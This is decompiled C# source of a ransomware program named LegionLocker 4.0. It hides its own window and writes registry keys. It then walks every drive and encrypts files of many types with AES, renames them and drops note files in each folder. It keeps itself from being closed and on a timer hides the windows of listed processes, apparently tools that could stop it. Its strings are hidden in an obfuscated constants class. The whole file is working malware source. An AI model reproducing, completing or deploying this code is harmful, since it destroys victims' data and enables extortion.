using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;

namespace LegionLocker4._0;

public class Form1 : Form
{
	private const int int_0 = 0;

	private const int int_1 = 5;

	private IContainer icontainer_0 = null;

	private Timer timer_0;

	public Form1()
	{
		method_0();
	}

	[DllImport("User32")]
	private static extern int ShowWindow(int int_2, int int_3);

	private void Form1_Load(object sender, EventArgs e)
	{
		((Form)this).set_Opacity(Class4.double_0);
		((Form)this).set_ShowInTaskbar(false);
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(Class4.string_0);
		registryKey.SetValue(Class4.string_1, 1, RegistryValueKind.String);
		RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey(Class4.string_2);
		registryKey2.SetValue(Class4.string_3, Class4.string_4, RegistryValueKind.String);
		RegistryKey registryKey3 = Registry.LocalMachine.CreateSubKey(Class4.string_5);
		registryKey3.SetValue(Class4.string_6, Class4.string_7, RegistryValueKind.String);
		RegistryKey registryKey4 = Registry.CurrentUser.CreateSubKey(Class4.string_8);
		registryKey4.SetValue(Class4.a, 1, RegistryValueKind.DWord);
		Encrypt();
	}

	public static string Base64Decode(string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.UTF8.GetString(bytes);
	}

	public static byte[] AES_Encrypt(byte[] byte_0, byte[] byte_1)
	{
		byte[] result = null;
		byte[] array = new byte[Class4.b];
		RuntimeHelpers.InitializeArray(array, (RuntimeFieldHandle)/*OpCode not supported: LdMemberToken*/);
		byte[] salt = array;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = Class4.c;
			rijndaelManaged.BlockSize = Class4.d;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_1, salt, Class4.e);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Mode = CipherMode.CBC;
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_0, 0, byte_0.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		return result;
	}

	public void EncryptFile(string string_0, string string_1)
	{
		byte[] byte_ = File.ReadAllBytes(string_0);
		byte[] bytes = Encoding.UTF8.GetBytes(string_1);
		bytes = SHA256.Create().ComputeHash(bytes);
		byte[] bytes2 = AES_Encrypt(byte_, bytes);
		File.WriteAllBytes(string_0, bytes2);
		File.Move(string_0, string_0 + Class4.f);
	}

	public void encryptDirectory(string string_0, string string_1)
	{
		try
		{
			string[] array = new string[Class4.g];
			array[0] = Class4.h;
			array[1] = Class4.i;
			array[2] = Class4.j;
			array[3] = Class4.k;
			array[4] = Class4.l;
			array[5] = Class4.m;
			array[6] = Class4.n;
			array[7] = Class4.o;
			array[8] = Class4.p;
			array[Class4.q] = Class4.r;
			array[Class4.s] = Class4.t;
			array[Class4.u] = Class4.v;
			array[Class4.w] = Class4.x;
			array[Class4.y] = Class4.z;
			array[Class4.A] = Class4.B;
			array[Class4.C] = Class4.D;
			array[Class4.E] = Class4.F;
			array[Class4.G] = Class4.H;
			array[Class4.I] = Class4.J;
			array[Class4.K] = Class4.L;
			array[Class4.M] = Class4.N;
			array[Class4.O] = Class4.P;
			array[Class4.Q] = Class4.R;
			array[Class4.S] = Class4.T;
			array[Class4.U] = Class4.V;
			array[Class4.W] = Class4.X;
			array[Class4.Y] = Class4.Z;
			array[Class4.sbyte_0] = Class4.string_9;
			array[Class4.sbyte_1] = Class4.string_10;
			array[Class4.sbyte_2] = Class4.string_11;
			array[Class4.sbyte_3] = Class4.string_12;
			array[Class4.sbyte_4] = Class4.string_13;
			array[Class4.a1] = Class4.b1;
			array[Class4.c1] = Class4.d1;
			array[Class4.e1] = Class4.f1;
			array[Class4.g1] = Class4.h1;
			array[Class4.i1] = Class4.j1;
			array[Class4.k1] = Class4.l1;
			array[Class4.m1] = Class4.n1;
			array[Class4.o1] = Class4.p1;
			array[Class4.q1] = Class4.r1;
			array[Class4.s1] = Class4.t1;
			array[Class4.u1] = Class4.v1;
			array[Class4.w1] = Class4.x1;
			array[Class4.y1] = Class4.z1;
			array[Class4.A1] = Class4.B1;
			array[Class4.C1] = Class4.D1;
			array[Class4.E1] = Class4.F1;
			array[Class4.G1] = Class4.H1;
			array[Class4.I1] = Class4.J1;
			array[Class4.K1] = Class4.L1;
			array[Class4.M1] = Class4.N1;
			array[Class4.O1] = Class4.P1;
			array[Class4.Q1] = Class4.R1;
			array[Class4.S1] = Class4.T1;
			array[Class4.U1] = Class4.V1;
			array[Class4.W1] = Class4.X1;
			array[Class4.Y1] = Class4.Z1;
			array[Class4.sbyte_5] = Class4.string_14;
			array[Class4.sbyte_6] = Class4.string_15;
			array[Class4.sbyte_7] = Class4.string_16;
			array[Class4.sbyte_8] = Class4.string_17;
			array[Class4.sbyte_9] = Class4.string_18;
			array[Class4.a2] = Class4.b2;
			array[Class4.c2] = Class4.d2;
			array[Class4.e2] = Class4.f2;
			array[Class4.g2] = Class4.h2;
			array[Class4.i2] = Class4.j2;
			array[Class4.k2] = Class4.l2;
			array[Class4.m2] = Class4.n2;
			array[Class4.o2] = Class4.p2;
			array[Class4.q2] = Class4.r2;
			array[Class4.s2] = Class4.t2;
			array[Class4.u2] = Class4.v2;
			array[Class4.w2] = Class4.x2;
			array[Class4.y2] = Class4.z2;
			array[Class4.A2] = Class4.B2;
			array[Class4.C2] = Class4.D2;
			array[Class4.E2] = Class4.F2;
			array[Class4.G2] = Class4.H2;
			array[Class4.I2] = Class4.J2;
			array[Class4.K2] = Class4.L2;
			array[Class4.M2] = Class4.N2;
			array[Class4.O2] = Class4.P2;
			array[Class4.Q2] = Class4.R2;
			array[Class4.S2] = Class4.T2;
			array[Class4.U2] = Class4.V2;
			array[Class4.W2] = Class4.X2;
			array[Class4.Y2] = Class4.Z2;
			array[Class4.sbyte_10] = Class4.string_19;
			array[Class4.sbyte_11] = Class4.string_20;
			array[Class4.sbyte_12] = Class4.string_21;
			array[Class4.sbyte_13] = Class4.string_22;
			array[Class4.sbyte_14] = Class4.string_23;
			array[Class4.a3] = Class4.b3;
			array[Class4.c3] = Class4.d3;
			array[Class4.e3] = Class4.f3;
			array[Class4.g3] = Class4.h3;
			array[Class4.i3] = Class4.j3;
			array[Class4.k3] = Class4.l3;
			array[Class4.m3] = Class4.n3;
			array[Class4.o3] = Class4.p3;
			array[Class4.q3] = Class4.r3;
			array[Class4.s3] = Class4.t3;
			array[Class4.u3] = Class4.v3;
			array[Class4.w3] = Class4.x3;
			array[Class4.y3] = Class4.z3;
			array[Class4.A3] = Class4.B3;
			array[Class4.C3] = Class4.D3;
			array[Class4.E3] = Class4.F3;
			array[Class4.G3] = Class4.H3;
			array[Class4.I3] = Class4.J3;
			array[Class4.K3] = Class4.L3;
			array[Class4.M3] = Class4.N3;
			array[Class4.O3] = Class4.P3;
			array[Class4.Q3] = Class4.R3;
			array[Class4.S3] = Class4.T3;
			array[Class4.U3] = Class4.V3;
			array[Class4.W3] = Class4.X3;
			array[Class4.Y3] = Class4.Z3;
			array[Class4.sbyte_15] = Class4.string_24;
			array[Class4.sbyte_16] = Class4.string_25;
			array[Class4.sbyte_17] = Class4.string_26;
			array[Class4.sbyte_18] = Class4.string_27;
			array[Class4.sbyte_19] = Class4.string_28;
			array[Class4.a4] = Class4.b4;
			array[Class4.c4] = Class4.d4;
			array[Class4.e4] = Class4.f4;
			array[Class4.g4] = Class4.h4;
			array[Class4.i4] = Class4.j4;
			array[Class4.k4] = Class4.l4;
			array[Class4.m4] = Class4.n4;
			array[Class4.o4] = Class4.p4;
			array[Class4.q4] = Class4.r4;
			array[Class4.s4] = Class4.t4;
			array[Class4.u4] = Class4.v4;
			array[Class4.w4] = Class4.x4;
			array[Class4.y4] = Class4.z4;
			array[Class4.A4] = Class4.B4;
			array[Class4.C4] = Class4.D4;
			array[Class4.E4] = Class4.F4;
			array[Class4.G4] = Class4.H4;
			array[Class4.I4] = Class4.J4;
			array[Class4.K4] = Class4.L4;
			array[Class4.M4] = Class4.N4;
			array[Class4.O4] = Class4.P4;
			array[Class4.Q4] = Class4.R4;
			array[Class4.S4] = Class4.T4;
			array[Class4.U4] = Class4.V4;
			array[Class4.W4] = Class4.X4;
			array[Class4.Y4] = Class4.Z4;
			array[Class4.int_0] = Class4.string_29;
			array[Class4.int_1] = Class4.string_30;
			array[Class4.int_2] = Class4.string_31;
			array[Class4.int_3] = Class4.string_32;
			array[Class4.int_4] = Class4.string_33;
			array[Class4.a5] = Class4.b5;
			array[Class4.c5] = Class4.d5;
			array[Class4.e5] = Class4.f5;
			array[Class4.g5] = Class4.h5;
			array[Class4.i5] = Class4.j5;
			array[Class4.k5] = Class4.l5;
			array[Class4.m5] = Class4.n5;
			array[Class4.o5] = Class4.p5;
			array[Class4.q5] = Class4.r5;
			array[Class4.s5] = Class4.t5;
			array[Class4.u5] = Class4.v5;
			array[Class4.w5] = Class4.x5;
			array[Class4.y5] = Class4.z5;
			array[Class4.A5] = Class4.B5;
			array[Class4.C5] = Class4.D5;
			array[Class4.E5] = Class4.F5;
			array[Class4.G5] = Class4.H5;
			array[Class4.I5] = Class4.J5;
			array[Class4.K5] = Class4.L5;
			array[Class4.M5] = Class4.N5;
			array[Class4.O5] = Class4.P5;
			array[Class4.Q5] = Class4.R5;
			array[Class4.S5] = Class4.T5;
			array[Class4.U5] = Class4.V5;
			array[Class4.W5] = Class4.X5;
			array[Class4.Y5] = Class4.Z5;
			array[Class4.int_5] = Class4.string_34;
			array[Class4.int_6] = Class4.string_35;
			array[Class4.int_7] = Class4.string_36;
			array[Class4.int_8] = Class4.string_37;
			array[Class4.int_9] = Class4.string_38;
			array[Class4.a6] = Class4.b6;
			array[Class4.c6] = Class4.d6;
			array[Class4.e6] = Class4.f6;
			array[Class4.g6] = Class4.h6;
			array[Class4.i6] = Class4.j6;
			array[Class4.k6] = Class4.l6;
			array[Class4.m6] = Class4.n6;
			array[Class4.o6] = Class4.p6;
			array[Class4.q6] = Class4.r6;
			array[Class4.s6] = Class4.t6;
			array[Class4.u6] = Class4.v6;
			array[Class4.w6] = Class4.x6;
			array[Class4.y6] = Class4.z6;
			array[Class4.A6] = Class4.B6;
			array[Class4.C6] = Class4.D6;
			array[Class4.E6] = Class4.F6;
			array[Class4.G6] = Class4.H6;
			array[Class4.I6] = Class4.J6;
			array[Class4.K6] = Class4.L6;
			array[Class4.M6] = Class4.N6;
			array[Class4.O6] = Class4.P6;
			array[Class4.Q6] = Class4.R6;
			array[Class4.S6] = Class4.T6;
			array[Class4.U6] = Class4.V6;
			array[Class4.W6] = Class4.X6;
			array[Class4.Y6] = Class4.Z6;
			array[Class4.int_10] = Class4.string_39;
			array[Class4.int_11] = Class4.string_40;
			array[Class4.int_12] = Class4.string_41;
			array[Class4.int_13] = Class4.string_42;
			array[Class4.int_14] = Class4.string_43;
			array[Class4.a7] = Class4.b7;
			array[Class4.c7] = Class4.d7;
			array[Class4.e7] = Class4.f7;
			array[Class4.g7] = Class4.h7;
			array[Class4.i7] = Class4.j7;
			array[Class4.k7] = Class4.l7;
			array[Class4.m7] = Class4.n7;
			array[Class4.o7] = Class4.p7;
			array[Class4.q7] = Class4.r7;
			array[Class4.s7] = Class4.t7;
			array[Class4.u7] = Class4.v7;
			array[Class4.w7] = Class4.x7;
			array[Class4.y7] = Class4.z7;
			array[Class4.A7] = Class4.B7;
			array[Class4.C7] = Class4.D7;
			array[Class4.E7] = Class4.F7;
			array[Class4.G7] = Class4.H7;
			array[Class4.I7] = Class4.J7;
			array[Class4.K7] = Class4.L7;
			array[Class4.M7] = Class4.N7;
			array[Class4.O7] = Class4.P7;
			array[Class4.Q7] = Class4.R7;
			array[Class4.S7] = Class4.T7;
			array[Class4.U7] = Class4.V7;
			array[Class4.W7] = Class4.X7;
			array[Class4.Y7] = Class4.Z7;
			array[Class4.int_15] = Class4.string_44;
			array[Class4.int_16] = Class4.string_45;
			array[Class4.int_17] = Class4.string_46;
			array[Class4.int_18] = Class4.string_47;
			array[Class4.int_19] = Class4.string_48;
			array[Class4.a8] = Class4.b8;
			array[Class4.c8] = Class4.d8;
			array[Class4.e8] = Class4.f8;
			array[Class4.g8] = Class4.h8;
			array[Class4.i8] = Class4.j8;
			array[Class4.k8] = Class4.l8;
			array[Class4.m8] = Class4.n8;
			array[Class4.o8] = Class4.p8;
			array[Class4.q8] = Class4.r8;
			array[Class4.s8] = Class4.t8;
			array[Class4.u8] = Class4.v8;
			array[Class4.w8] = Class4.x8;
			array[Class4.y8] = Class4.z8;
			array[Class4.A8] = Class4.B8;
			array[Class4.C8] = Class4.D8;
			array[Class4.E8] = Class4.F8;
			array[Class4.G8] = Class4.H8;
			array[Class4.I8] = Class4.J8;
			array[Class4.K8] = Class4.L8;
			array[Class4.M8] = Class4.N8;
			array[Class4.O8] = Class4.P8;
			array[Class4.Q8] = Class4.R8;
			array[Class4.S8] = Class4.T8;
			string[] source = array;
			string[] files = Directory.GetFiles(string_0);
			string[] directories = Directory.GetDirectories(string_0);
			for (int i = 0; i < files.Length; i++)
			{
				string extension = Path.GetExtension(files[i]);
				if (source.Contains(extension))
				{
					EncryptFile(files[i], string_1);
					string path = string_0 + Class4.U8;
					string[] array2 = new string[Class4.V8];
					array2[0] = Class4.W8;
					array2[1] = Class4.X8;
					array2[2] = Class4.Y8;
					array2[3] = Class4.Z8;
					array2[4] = Class4.string_49;
					array2[5] = Class4.string_50;
					array2[6] = Class4.string_51;
					array2[7] = Class4.string_52;
					array2[8] = Class4.string_53;
					array2[Class4.sbyte_20] = Class4.string_54;
					array2[Class4.sbyte_21] = Class4.string_55;
					array2[Class4.sbyte_22] = Class4.a9;
					array2[Class4.b9] = Class4.c9;
					array2[Class4.d9] = Class4.e9;
					array2[Class4.f9] = Class4.g9;
					array2[Class4.h9] = Class4.i9;
					array2[Class4.j9] = Class4.k9;
					array2[Class4.l9] = Class4.m9;
					array2[Class4.n9] = Class4.o9;
					array2[Class4.p9] = Class4.q9;
					array2[Class4.r9] = Class4.s9;
					array2[Class4.t9] = Class4.u9;
					array2[Class4.v9] = Class4.w9;
					array2[Class4.x9] = Class4.y9;
					array2[Class4.z9] = Class4.A9;
					array2[Class4.B9] = Class4.C9;
					array2[Class4.D9] = Class4.E9;
					array2[Class4.F9] = Class4.G9;
					array2[Class4.H9] = Class4.I9;
					array2[Class4.J9] = Class4.K9;
					array2[Class4.L9] = Class4.M9;
					array2[Class4.N9] = Class4.O9;
					array2[Class4.P9] = Class4.Q9;
					array2[Class4.R9] = Class4.S9;
					string[] contents = array2;
					File.WriteAllLines(path, contents);
				}
			}
			for (int j = 0; j < directories.Length; j++)
			{
				if (!directories[j].Contains(Class4.T9) && !directories[j].Contains(Class4.U9) && !directories[j].Contains(Class4.V9) && !directories[j].Contains(Class4.W9))
				{
					encryptDirectory(directories[j], string_1);
				}
			}
		}
		catch (Exception)
		{
		}
	}

	public void Encrypt()
	{
		string y = Class4.Y9;
		string userName = Environment.UserName;
		string string_ = y;
		string z = Class4.Z9;
		string[] logicalDrives = Directory.GetLogicalDrives();
		string[] array = logicalDrives;
		foreach (string text in array)
		{
			if (text == Class4.string_56)
			{
				encryptDirectory(text, z);
			}
			else
			{
				encryptDirectory(string_, z);
			}
		}
		string path = y + userName + Class4.string_57;
		string[] array2 = new string[Class4.sbyte_23];
		array2[0] = Class4.string_58;
		array2[1] = Class4.string_59;
		array2[2] = Class4.string_60;
		array2[3] = Class4.string_61;
		array2[4] = Class4.string_62;
		array2[5] = Class4.string_63;
		array2[6] = Class4.string_64;
		array2[7] = Class4.aa;
		array2[8] = Class4.ba;
		array2[Class4.ca] = Class4.da;
		array2[Class4.ea] = Class4.fa;
		array2[Class4.ga] = Class4.ha;
		array2[Class4.ia] = Class4.ja;
		array2[Class4.ka] = Class4.la;
		array2[Class4.ma] = Class4.na;
		array2[Class4.oa] = Class4.pa;
		array2[Class4.qa] = Class4.ra;
		array2[Class4.sa] = Class4.ta;
		array2[Class4.ua] = Class4.va;
		array2[Class4.wa] = Class4.xa;
		array2[Class4.ya] = Class4.za;
		array2[Class4.Aa] = Class4.Ba;
		array2[Class4.Ca] = Class4.Da;
		array2[Class4.Ea] = Class4.Fa;
		array2[Class4.Ga] = Class4.Ha;
		array2[Class4.Ia] = Class4.Ja;
		array2[Class4.Ka] = Class4.La;
		array2[Class4.Ma] = Class4.Na;
		array2[Class4.Oa] = Class4.Pa;
		array2[Class4.Qa] = Class4.Ra;
		array2[Class4.Sa] = Class4.Ta;
		array2[Class4.Ua] = Class4.Va;
		array2[Class4.Wa] = Class4.Xa;
		array2[Class4.Ya] = Class4.Za;
		string[] contents = array2;
		File.WriteAllLines(path, contents);
		z = null;
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	private void timer_0_Tick(object sender, EventArgs e)
	{
		timer_0.Stop();
		try
		{
			Process[] processes = Process.GetProcesses();
			Process[] array = processes;
			foreach (Process process in array)
			{
				if (process.ProcessName == Class4.string_65)
				{
					int int_ = process.MainWindowHandle.ToInt32();
					ShowWindow(int_, 0);
				}
				if (process.ProcessName == Class4.string_66)
				{
					int int_ = process.MainWindowHandle.ToInt32();
					ShowWindow(int_, 0);
				}
				if (process.ProcessName == Class4.string_67)
				{
					int int_ = process.MainWindowHandle.ToInt32();
					ShowWindow(int_, 0);
				}
				if (process.ProcessName == Class4.string_68)
				{
					int int_ = process.MainWindowHandle.ToInt32();
					ShowWindow(int_, 0);
				}
				if (process.ProcessName == Class4.string_69)
				{
					int int_ = process.MainWindowHandle.ToInt32();
					ShowWindow(int_, 0);
				}
				if (process.ProcessName == Class4.string_70)
				{
					int int_ = process.MainWindowHandle.ToInt32();
					ShowWindow(int_, 0);
				}
				if (process.ProcessName == Class4.string_71)
				{
					int int_ = process.MainWindowHandle.ToInt32();
					ShowWindow(int_, 0);
				}
				if (process.ProcessName == Class4.string_72)
				{
					int int_ = process.MainWindowHandle.ToInt32();
					ShowWindow(int_, 0);
				}
				if (process.ProcessName == Class4.string_73)
				{
					int int_ = process.MainWindowHandle.ToInt32();
					ShowWindow(int_, 0);
				}
				if (process.ProcessName == Class4.string_74)
				{
					int int_ = process.MainWindowHandle.ToInt32();
					ShowWindow(int_, 0);
				}
				if (process.ProcessName == Class4.ab)
				{
					int int_ = process.MainWindowHandle.ToInt32();
					ShowWindow(int_, 0);
				}
				if (process.ProcessName == Class4.bb)
				{
					int int_ = process.MainWindowHandle.ToInt32();
					ShowWindow(int_, 0);
				}
				if (process.ProcessName == Class4.cb)
				{
					int int_ = process.MainWindowHandle.ToInt32();
					ShowWindow(int_, 0);
				}
				if (process.ProcessName == Class4.db)
				{
					int int_ = process.MainWindowHandle.ToInt32();
					ShowWindow(int_, 0);
				}
				if (process.ProcessName == Class4.eb)
				{
					int int_ = process.MainWindowHandle.ToInt32();
					ShowWindow(int_, 0);
				}
				if (process.ProcessName == Class4.fb)
				{
					int int_ = process.MainWindowHandle.ToInt32();
					ShowWindow(int_, 0);
				}
			}
		}
		catch (Exception)
		{
		}
		timer_0.Start();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void method_0()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_00ae: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b8: Expected O, but got Unknown
		icontainer_0 = new Container();
		timer_0 = new Timer(icontainer_0);
		((Control)this).SuspendLayout();
		timer_0.set_Enabled(true);
		timer_0.set_Interval((int)Class4.gb);
		timer_0.add_Tick((EventHandler)timer_0_Tick);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(Class4.hb, Class4.ib));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_AutoSizeMode((AutoSizeMode)0);
		((Form)this).set_ClientSize(new Size(Class4.jb, Class4.kb));
		((Control)this).set_Name(Class4.lb);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
